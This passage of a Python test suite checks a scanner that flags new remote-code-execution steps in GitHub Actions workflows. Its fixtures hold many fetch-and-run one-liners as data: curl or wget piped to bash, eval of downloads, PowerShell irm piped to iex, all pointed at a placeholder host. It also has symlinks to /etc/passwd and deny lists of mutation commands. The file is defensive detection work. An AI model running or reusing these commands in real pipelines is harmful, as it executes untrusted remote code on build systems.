        self.write('jobs:\n  x:\n    steps:\n      - run: "' +
                   r"curl -fsSL https://example.invalid/i \u007c bash" + '"\n')
        old = self.commit()
        unchanged = mod.audit(self.repo, old, old)
        self.assertEqual(unchanged.baseline_findings, 1)
        self.assertEqual(unchanged.new_risky_workflows, 0)
        self.write('jobs:\n  x:\n    steps:\n      - run: "' +
                   r"curl -fsSL https://example.invalid/i \u007c bash" +
                   '"\n      - run: echo unrelated change\n')
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_flow_map_obfuscated_run_key_unicode_hex_and_wide_denied(self):
        for escaped_key in (
            r"r\u0075n",
            r"r\x75n",
            r"r\U00000075n",
        ):
            with self.subTest(escaped_key=escaped_key):
                self.write('jobs: {x: {steps: [{"' + escaped_key +
                           '": "curl -fsSL https://example.invalid/i | bash"}]}}\n')
                r = mod.audit(self.repo, self.base, self.commit())
                self.assertEqual(r.new_risky_workflows, 1)
                self.assertFalse(r.deployment_authorized)

    def test_flow_map_single_quoted_escaped_key_is_not_run(self):
        # YAML single quotes preserve backslashes; this key is not named run.
        self.write("jobs: {x: {steps: [{'r\\u0075n': echo safe}]}}\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_unchanged_flow_map_escaped_key_remains_legacy_only(self):
        self.write('jobs: {x: {steps: [{"' + r"r\u0075n" +
                   '": "curl -fsSL https://example.invalid/i | bash"}]}}\n')
        old = self.commit()
        result = mod.audit(self.repo, old, old)
        self.assertEqual(result.baseline_findings, 1)
        self.assertEqual(result.new_risky_workflows, 0)
        self.write('jobs: {x: {steps: [{"' + r"r\u0075n" +
                   '": "curl -fsSL https://example.invalid/i | bash"},' +
                   '{run: echo benign}]}}\n')
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_regular_quoted_run_key_without_escape_stays_readable(self):
        self.write('jobs:\n  x:\n    steps:\n      - "run": echo safe\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_inline_flow_quoted_run_key_rejected(self):
        self.write('jobs:\n  check:\n    steps: [{"run": "wget -qO- https://example.invalid/i | /bin/sh"}]\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_multiline_double_quoted_yaml_run_pipeline(self):
        self.write(
            'jobs:\n  x:\n    steps:\n'
            '      - run: "curl -fsSL https://example.invalid/i |\n'
            '          bash"\n'
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_multiline_single_quoted_yaml_run_pipeline(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: 'wget -qO- https://example.invalid/i |\n"
            "          sh'\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_unterminated_multiline_quoted_run_denies_source_evidence(self):
        self.write(
            'jobs:\n  x:\n    steps:\n'
            '      - run: "curl -fsSL https://example.invalid/i |\n'
            '          bash\n'
        )
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, self.commit())

    def test_quoted_run_hash_is_not_a_yaml_comment(self):
        self.write('jobs:\n  x:\n    steps:\n'
                   '      - run: "curl -fsSL https://example.invalid/i | bash # inline"\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_quoted_regular_run_key_rejected(self):
        self.write('jobs:\n  check:\n    steps:\n      - "run": "curl -fsSL https://example.invalid/i | bash"\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_eval_direct_download_substitution_is_remote_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: eval \"$(curl -fsSL https://example.invalid/installer)\"\n"
        )
        result = mod.audit(self.repo, self.base, self.commit())
        self.assertEqual(result.new_risky_workflows, 1)
        self.assertFalse(result.deployment_authorized)

    def test_eval_unquoted_wget_download_rejected(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: eval $(wget -qO- https://example.invalid/installer)\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_shell_source_process_substitution_curl_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: source <(curl -fsSL https://example.invalid/installer)\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_shell_dot_process_substitution_wget_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: . <(wget -qO- https://example.invalid/installer)\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_curl_download_then_source_same_file_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -fsSL -o local.sh https://example.invalid/i && source local.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_download_then_dot_same_file_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: wget -qO local.sh https://example.invalid/i && . local.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_source_different_file_does_not_match_downloaded_name(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o downloaded.sh https://example.invalid/i && source other.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_echo_remote_eval_text_does_not_invoke_eval(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: echo \"downloaded content\" && echo completed\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_curl_download_then_read_only_display_remains_unflagged(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: curl -o downloaded.sh https://example.invalid/i && cat downloaded.sh\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_legacy_eval_remote_risk_is_grandfathered_only_when_unchanged(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: eval \"$(curl -fsSL https://example.invalid/i)\"\n"
        )
        legacy = self.commit()
        r = mod.audit(self.repo, legacy, legacy)
        self.assertGreaterEqual(r.baseline_findings, 1)
        self.assertEqual(r.new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - run: eval \"$(curl -fsSL https://example.invalid/i)\"\n"
            "      - run: echo changed\n"
        )
        self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)

    def test_curl_to_var_and_immediate_eval_is_remote_code(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$payload"\n'
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_wget_to_var_and_immediate_bash_c_is_remote_code(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: script=$(wget -qO- https://example.invalid/i); bash -c "$script"\n'
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_var_braced_name_executes_in_dash(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: payload="$(curl -fsSL https://example.invalid/i)" && dash -c "${payload}"\n'
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_var_safe_print_is_not_shell_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: payload=$(curl -fsSL https://example.invalid/i) && printf "%s\\n" "$payload"\n'
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_var_mismatched_name_not_proven_executable(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$different"\n'
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_var_case_sensitive_shell_names_not_equivalent(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$PAYLOAD"\n'
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_download_var_legacy_stays_nonnew_until_workflow_edit(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$payload"\n'
        )
        old = self.commit()
        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            '      - run: payload=$(curl -fsSL https://example.invalid/i) && eval "$payload"\n'
            "      - run: echo touched\n"
        )
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_powershell_irm_piped_into_iex_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: pwsh\n"
            "        run: irm https://example.invalid/install.ps1 | iex\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_powershell_invoke_webrequest_invoke_expression_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: powershell\n"
            "        run: Invoke-WebRequest https://example.invalid/install.ps1 | Invoke-Expression\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_powershell_iex_nested_irm_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: pwsh\n"
            "        run: iex (irm https://example.invalid/install.ps1)\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_powershell_invoke_expression_nested_full_name_denied(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: pwsh\n"
            "        run: Invoke-Expression (Invoke-RestMethod https://example.invalid/install.ps1)\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_powershell_iwr_safe_json_conversion_not_execution(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: pwsh\n"
            "        run: iwr https://example.invalid/data.json | ConvertFrom-Json\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_powershell_irm_only_fetch_is_not_shell_evaluation(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: pwsh\n"
            "        run: irm https://example.invalid/data.json\n"
        )
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_powershell_iex_legacy_workflow_is_only_historical_if_same_blob(self):
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: pwsh\n"
            "        run: irm https://example.invalid/install.ps1 | iex\n"
        )
        old = self.commit()
        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
        self.write(
            "jobs:\n  x:\n    steps:\n"
            "      - shell: pwsh\n"
            "        run: irm https://example.invalid/install.ps1 | iex\n"
            "      - run: echo changed\n"
        )
        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)

    def test_shell_command_substitution_curl_denied(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_shell_command_substitution_wget_denied(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: sh -c '$(wget -qO- https://example.invalid/install.sh)'\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_opaque_alias_run_is_never_false_green(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: *download_alias\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_opaque_yaml_tag_run_denied(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: !dynamic_script script_value\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_flow_non_shell_command_is_safe(self):
        self.write('jobs: {check: {steps: [{run: "echo safe"}]}}\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_shell_here_string_download_substitution_is_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   '      - run: bash <<< "$(curl -fsSL https://example.invalid/i)"\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_shell_stdin_redirect_from_process_substitution_is_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: bash < <(wget -qO- https://example.invalid/i)\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_python_stdin_redirect_from_remote_source_is_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: python3 - < <(curl -fsSL https://example.invalid/i)\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_download_stored_as_variable_without_execution_not_blocked(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   '      - run: printf "%s" "$(curl -fsSL https://example.invalid/i)"\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_process_substitution_rejected(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: bash <(curl -fsSL https://example.invalid/s)\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_yaml_plain_run_comment_does_not_create_false_remote_debt(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   "      - run: echo safe # curl -fsSL https://example.invalid/i | bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 0)

    def test_yaml_quoted_run_comment_like_text_is_not_truncated(self):
        self.write("jobs:\n  x:\n    steps:\n"
                   '      - run: "curl -fsSL https://example.invalid/i | bash # included"\n')
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)

    def test_comment_and_regular_text_not_blocked(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          # curl foo | bash\n          echo 'curl not executing'\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)

    def test_unmodified_legacy_finding_grandfathered(self):
        self.write("jobs:\n  x:\n    steps:\n      - run: curl https://example.invalid | bash\n")
        legacy = self.commit()
        self.assertEqual(mod.audit(self.repo, legacy, legacy).new_risky_workflows, 0)
        self.assertEqual(mod.audit(self.repo, legacy, legacy).baseline_findings, 1)
        self.write("jobs:\n  x:\n    steps:\n      - run: curl https://example.invalid | bash\n      - run: echo added\n")
        self.assertEqual(mod.audit(self.repo, legacy, self.commit()).new_risky_workflows, 1)

    def test_nested_local_composite_action_remote_shell_rejected(self):
        action = self.repo / "examples" / "packaging" / "action.yaml"
        action.parent.mkdir(parents=True)
        action.write_text(
            "name: packaging\nruns:\n  using: composite\n  steps:\n"
            "    - shell: bash\n      run: curl -fsSL https://example.invalid/i | bash\n",
            encoding="utf-8",
        )
        r = mod.audit(self.repo, self.base, self.commit())
        self.assertEqual(r.new_risky_workflows, 1)
        self.assertEqual(r.candidate_findings, 1)

    def test_symlinked_nested_action_rejected(self):
        action = self.repo / "examples" / "packaging" / "action.yml"
        action.parent.mkdir(parents=True)
        action.symlink_to("/etc/passwd")
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, self.commit())

    def test_oversized_composite_action_is_rejected_before_scanning(self):
        action = self.repo / "action.yaml"
        action.write_text("name: large\n" + "#" * (mod.MAX_FILE_BYTES + 1))
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, self.commit())

    def test_binary_action_evidence_is_rejected(self):
        action = self.repo / "action.yml"
        action.write_bytes(b"name: invalid\nruns: \xff\n")
        with self.assertRaises(UnicodeDecodeError):
            mod.audit(self.repo, self.base, self.commit())

    def test_null_terminated_action_evidence_is_rejected(self):
        action = self.repo / "action.yaml"
        action.write_bytes(b"name: invalid\x00injected\n")
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, self.commit())

    def test_unrelated_yaml_docs_not_treated_as_action(self):
        doc = self.repo / "docs" / "example.yml"
        doc.parent.mkdir(parents=True)
        doc.write_text("run: curl https://example.invalid/i | bash\n")
        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 0)

    def test_local_action_gitlink_is_untrusted_source(self):
        # Create a genuine mode-160000 Git tree entry without cloning a submodule.
        call(self.repo, "update-index", "--add", "--cacheinfo",
             f"160000,{self.base},.github/actions/untrusted")
        call(self.repo, "commit", "-qm", "insert gitlink")
        head = call(self.repo, "rev-parse", "HEAD")
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, head)

    def test_workflow_submodule_entry_is_untrusted_source(self):
        call(self.repo, "update-index", "--add", "--cacheinfo",
             f"160000,{self.base},.github/workflows/helper")
        call(self.repo, "commit", "-qm", "insert workflow gitlink")
        head = call(self.repo, "rev-parse", "HEAD")
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, head)

    def test_exact_actions_directory_symlink_is_rejected(self):
        actions_dir = self.repo / ".github" / "actions"
        actions_dir.symlink_to("/tmp/actions-untrusted")
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, self.commit())

    def test_exact_workflows_directory_symlink_is_rejected(self):
        workflow = self.repo / ".github" / "workflows" / "demo.yml"
        workflow.unlink()
        (self.repo / ".github" / "workflows").rmdir()
        (self.repo / ".github" / "workflows").symlink_to("/tmp/workflows-untrusted")
        # A composite Action elsewhere must not hide a symlinked workflow tree.
        action = self.repo / "action.yml"
        action.write_text("name: safe\nruns:\n  using: composite\n  steps:\n    - run: echo safe\n      shell: bash\n")
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, self.commit())

    def test_symlink_tree_rejected_and_redacted(self):
        target = self.repo / ".github/workflows/demo.yml"
        target.unlink()
        target.symlink_to("/etc/passwd")
        head = self.commit()
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, self.base, head)

    def test_git_stdout_descriptor_closes_after_success(self):
        real_popen = mod.subprocess.Popen
        seen = []

        def tracked(*args, **kwargs):
            process = real_popen(*args, **kwargs)
            seen.append(process)
            return process

        with patch.object(mod.subprocess, "Popen", side_effect=tracked):
            self.assertEqual(mod.git(self.repo, "rev-parse", "HEAD").decode().strip(), self.base)
        self.assertTrue(seen)
        self.assertTrue(all(p.stdout is not None and p.stdout.closed for p in seen))

    def test_git_stdout_descriptor_closes_after_oversized_capture(self):
        real_popen = mod.subprocess.Popen
        seen = []

        def tracked(*args, **kwargs):
            process = real_popen(*args, **kwargs)
            seen.append(process)
            return process

        with patch.object(mod.subprocess, "Popen", side_effect=tracked):
            with patch.object(mod, "MAX_GIT_OUTPUT_BYTES", 1):
                with self.assertRaises(mod.SourceError):
                    mod.git(self.repo, "ls-tree", "-r", "-z", self.base)
        self.assertTrue(seen)
        self.assertTrue(all(p.stdout is not None and p.stdout.closed for p in seen))

    def test_git_bounded_capture_allows_ordinary_sha(self):
        with patch.object(mod, "MAX_GIT_OUTPUT_BYTES", 48):
            result = mod.git(self.repo, "rev-parse", "HEAD").decode().strip()
        self.assertEqual(result, self.base)

    def test_git_bounded_capture_rejects_large_tree_before_parsing(self):
        # A tiny artificial limit proves the pipe is bounded independently of
        # MAX_FILES and MAX_FILE_BYTES in the tree parser.
        with patch.object(mod, "MAX_GIT_OUTPUT_BYTES", 50):
            with self.assertRaises(mod.SourceError):
                mod.git(self.repo, "ls-tree", "-r", "-z", self.base)

    def test_git_large_blob_does_not_return_unbounded_data(self):
        target = self.repo / "large-safe-fixture.txt"
        target.write_text("x" * 8192, encoding="utf-8")
        blob_sha = call(self.repo, "hash-object", "-w", str(target))
        with patch.object(mod, "MAX_GIT_OUTPUT_BYTES", 64):
            with self.assertRaises(mod.SourceError):
                mod.git(self.repo, "cat-file", "blob", blob_sha)

    def test_git_subprocess_failure_does_not_leak_stderr(self):
        with self.assertRaisesRegex(mod.SourceError, "Git evidence unavailable"):
            mod.git(self.repo, "rev-parse", "nonexistent-secret-ref")

    def test_git_capture_error_refuses_false_green_cli_admission(self):
        stream = io.StringIO()
        with patch.object(mod, "MAX_GIT_OUTPUT_BYTES", 50):
            with redirect_stdout(stream):
                exit_code = mod.main([
                    "--repo", str(self.repo), "--base", self.base,
                    "--head", self.base,
                ])
        report = json.loads(stream.getvalue())
        self.assertEqual(exit_code, 2)
        self.assertIs(report["source_complete"], False)
        self.assertIsNone(report["new_risky_workflows"])
        self.assertFalse(report["release_authorized"])
        self.assertFalse(report["deployment_authorized"])
        self.assertFalse(report["mutation_performed"])

    def test_missing_sha_and_wrong_ancestry_denied(self):
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, "main", self.base)
        self.write("jobs:\n  x:\n    steps:\n      - run: echo new\n")
        head = self.commit()
        with self.assertRaises(mod.SourceError):
            mod.audit(self.repo, head, self.base)

    def test_cli_outputs_zero_authority_failure(self):
        s = io.StringIO()
        with redirect_stdout(s):
            code = mod.main(["--repo", str(self.repo), "--base", "notasha", "--head", self.base])
        v = json.loads(s.getvalue())
        self.assertEqual(code, 2)
        self.assertIs(v["source_complete"], False)
        self.assertFalse(v["release_authorized"])
        self.assertNotIn(str(self.repo), s.getvalue())



class OperatorSummaryTests(unittest.TestCase):
    def payload(self, *, candidates=0, new=0, complete=True):
        return {
            "policy": "zcloud-remote-shell-no-new-debt-v1",
            "baseline_findings": 0,
            "candidate_findings": candidates,
            "new_risky_workflows": new,
            "source_complete": complete,
            "release_authorized": False,
            "deployment_authorized": False,
            "mutation_performed": False,
        }

    def test_green_summary_is_dutch_and_non_authorizing(self):
        message = mod.operator_summary(self.payload(), 0)
        self.assertIn("Geen nieuwe", message)
        self.assertIn("Geen productieautorisatie", message)
        self.assertNotIn("https://", message)

    def test_red_summary_has_no_approval(self):
        message = mod.operator_summary(self.payload(candidates=1, new=1), 1)
        self.assertIn("Nieuw risico", message)
        self.assertIn("Geen productieautorisatie", message)

    def test_incomplete_evidence_is_not_green(self):
        report = self.payload(complete=False)
        report["baseline_findings"] = None
        report["candidate_findings"] = None
        report["new_risky_workflows"] = None
        message = mod.operator_summary(report, 2)
        self.assertIn("Onvolledig", message)
        self.assertIn("Geen productieautorisatie", message)

    def test_forged_green_and_boolean_as_integer_denied(self):
        report = self.payload(candidates=1, new=1)
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(report, 0)
        report = self.payload(candidates=True)
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(report, 0)
        report = self.payload()
        report["release_authorized"] = True
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(report, 0)

    def test_contradictory_count_and_status_denied(self):
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(self.payload(candidates=0, new=1), 1)
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(self.payload(), 1)
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(self.payload(), 2)

    def test_duplicate_report_keys_and_non_finite_numbers_denied(self):
        for report in (
            '{"policy":"x","policy":"zcloud-remote-shell-no-new-debt-v1"}',
            '{"new_risky_workflows":NaN}',
            '{"new_risky_workflows":Infinity}',
            '{"new_risky_workflows":-Infinity}',
        ):
            with self.subTest(report=report):
                with self.assertRaises(mod.SourceError):
                    mod.parse_operator_result(report)

    def test_oversized_result_and_untrusted_nested_payload_denied(self):
        with self.assertRaises(mod.SourceError):
            mod.parse_operator_result('{"payload":"' + "x" * 9000 + '"}')
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(mod.parse_operator_result('{"policy":{"unexpected":"object"}}'), 0)

    def test_unknown_fields_and_large_untrusted_values_denied(self):
        report = self.payload()
        report["unexpected"] = "do-not-publish"
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(report, 0)
        report = self.payload(candidates=10_000_001)
        with self.assertRaises(mod.SourceError):
            mod.operator_summary(report, 1)


class WorkflowTrustTests(unittest.TestCase):
    def setUp(self):
        self.text = (HERE / ".github/workflows/zcloud-remote-shell-no-new-debt-20261015-w1.yml").read_text(encoding="utf-8")

    def test_hosted_readonly_pr_only(self):
        self.assertIn("pull_request:", self.text)
        self.assertNotIn("workflow_dispatch:", self.text)
        self.assertNotIn("pull_request_target:", self.text)
        self.assertNotIn("workflow_run:", self.text)
        self.assertIn("runs-on: ubuntu-latest", self.text)
        self.assertNotIn("runs-on: [self-hosted", self.text)
        self.assertIn("permissions:\n  contents: read", self.text)
        self.assertNotIn("contents: write", self.text)
        self.assertIn("cancel-in-progress: false", self.text)

    def test_symmetric_owner_and_exact_head_guards(self):
        for marker in (
            "github.repository == 'Zennay/zCloud'",
            "github.actor == 'Zennay'",
            "github.triggering_actor == 'Zennay'",
            "github.event.pull_request.head.repo.full_name == github.repository",
            "ref: ${{ github.event.pull_request.head.sha }}",
            "persist-credentials: false",
            'test "$(git rev-parse HEAD)" = "$HEAD_SHA"',
            "git ls-remote origin refs/heads/main",
        ):
            with self.subTest(marker=marker):
                self.assertIn(marker, self.text)

    def test_pr_head_movement_is_checked_twice(self):
        self.assertIn("HEAD_REF: ${{ github.event.pull_request.head.ref }}", self.text)
        self.assertIn('git check-ref-format "refs/heads/$HEAD_REF"', self.text)
        proof = 'git ls-remote --exit-code origin "refs/heads/$HEAD_REF"'
        self.assertEqual(self.text.count(proof), 2)
        self.assertIn('test "$(git rev-parse HEAD)" = "$HEAD_SHA"', self.text)

    def test_ci_summary_uses_strict_report_and_preserves_failure_exit(self):
        for marker in (
            "parse_operator_result",
            "operator_summary",
            'test "$scan_exit" -eq 0',
            'SOURCE_REPORT="$report"',
            '"GITHUB_STEP_SUMMARY"',
            'set +e',
            'set -e',
        ):
            with self.subTest(marker=marker):
                self.assertIn(marker, self.text)

    def test_ci_summary_does_not_upload_or_publish_untrusted_source(self):
        for token in (
            "upload-artifact",
            "actions/github-script",
            "gh api ",
            "GITHUB_TOKEN:",
            "pull_request_target:",
            "workflow_run:",
            "workflow_dispatch:",
            "zcloud-production-deploy",
        ):
            with self.subTest(token=token):
                self.assertNotIn(token, self.text)

    def test_workflow_has_no_live_mutation_commands(self):
        for forbidden in (
            "systemctl ", "sudo ", "sqlite3 ", "ssh ",
            "workflow_dispatch ", "gh workflow run", "git push",
            "cancel-run", "POST /repos/", "zcloud-production-deploy",
        ):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, self.text)




if __name__ == "__main__":
    unittest.main()
